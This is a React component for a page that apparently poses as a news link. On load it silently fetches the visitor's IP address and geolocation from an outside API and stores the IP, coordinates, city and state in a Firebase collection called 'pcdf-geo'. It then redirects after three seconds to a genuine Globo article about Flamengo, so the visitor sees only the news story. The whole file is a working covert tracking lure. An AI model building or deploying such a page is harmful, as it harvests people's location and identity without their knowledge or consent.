import React, { useState, useEffect } from 'react';
import { db } from '../utils/firebase';

export function Noticia01() {

    // const [lat, setLat] = useState(null);
    // const [lng, setLng] = useState(null);
    // const [ip, setIp] = useState(null);
    // const [country, setCountry] = useState(null);
    const [status, setStatus] = useState(null);
    // const [city, setCity] = useState(null);
    // const [state, setState] = useState(null);

    const API = 'https://geolocation-db.com/json/';
    const DEFAULT_QUERY = 'redux';
    const REDIRECT_URL = 'https://ge.globo.com/futebol/times/flamengo/noticia/gabigol-cobra-medidas-apos-racismo-em-jogo-do-flamengo-passam-pano-e-nao-e-o-certo.ghtml';

    async function setGeolocationData() {
        fetch(API + DEFAULT_QUERY)
        .then(response => {
            if (response.ok) {
                setStatus(null);
                return response.json();
            } else {
                setStatus('Something went wrong ...');
            }
        })
        .then(data => {
            console.debug('result IP', data);
            // setIp(data.IPv4);
            // setCountry(data.country_name);
            // setCity(data.city);
            // setState(data.state);
            // setLat(data.latitude);
            // setLng(data.longitude);
            setStatus(null);
            db.collection("pcdf-geo").doc().set({
                data: new Date(),
                ip: data.IPv4,
                porta: 433,
                latitude: data.latitude,
                longitude: data.longitude,
                cidade: data.city,
                estado: data.state
            })
            .then(() => {
                console.debug("Document successfully written!");
            })
            .catch((error) => {
                console.error("Error writing document: ", error);
            });
        })
        .catch(error => setStatus('Unable to retrieve your location'));
    }

    useEffect(()=> {
	    setStatus('Localizando...');
        setGeolocationData().then( _ =>{
            // window.location.replace("https://google.com/contact");
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 3000);
        });
    }, []);

	return (
		<div className="App">
			{/* <button onClick={getLocation}>Pegar Localização</button> */}
			{/* <h1>Coordenadas</h1> */}
            <p>{status}</p>
			{/* {lat && <p>Latitude: {lat}</p>}
			{lng && <p>Longitude: {lng}</p>}
            {ip && <p>IP: {ip}</p>}
            {country && <p>Pais: {country}</p>}
            {city && <p>Cidade: {city}</p>}
            {state && <p>Estado: {state}</p>} */}
		</div>
	);
}
